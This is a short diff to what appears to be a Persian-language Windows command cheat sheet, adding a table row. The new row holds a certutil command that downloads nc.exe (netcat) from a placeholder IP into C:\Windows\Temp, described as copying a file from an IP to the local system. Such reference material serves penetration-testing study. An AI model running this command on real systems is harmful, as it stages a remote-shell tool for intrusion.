@@ -267,6 +267,10 @@ published: true
         <p>(space after start=)</p>
       </td>
     </tr>
+     <tr>
+      <td style="text-align:left">cmd.exe /c certutil -urlcache -split -f http://ip/nc.exe c:/windows/temp/nc.exe</td>
+      <td style="text-align:left">کپی فایل از ip به سیستم جاری توسط cmd.exe</td>
+    </tr>
     <tr>
       <td style="text-align:left">xcopy /s \\ ip \dir C:\local</td>
       <td style="text-align:left">کپی از فودر ip</td>
